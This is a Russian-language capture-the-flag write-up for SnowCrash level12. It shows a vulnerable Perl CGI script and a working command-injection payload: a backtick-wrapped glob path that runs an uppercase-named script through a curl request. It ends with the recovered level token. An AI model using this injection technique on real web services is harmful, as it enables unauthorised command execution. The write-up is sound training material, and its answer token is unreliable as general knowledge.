```bash
level12@SnowCrash:~$ cat ./level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Приложение запущено на localhost:4646, которое ожидает два параметра x и y.
В sub t каталог меняется на tmp и далее выполняется egrep. Попробуем выполнить getflag в этой конструкции. (сервер запущен от flag12)

Аргумент x проходит через цепочку изменений:
- `$xx =~ tr/a-z/A-Z/`: переводим все символы в UPPERCASE
- `$xx =~ s/\s.*//`: удалить все после пробела

Поэтому мы не можем просто использовать -`:4646?x=getflag>/tmp/flag`

```bash
level12@SnowCrash:~$ cat /tmp/GETFLAG
getflag > /tmp/flag
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/GETFLAG`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Этот токен подойдет к level13
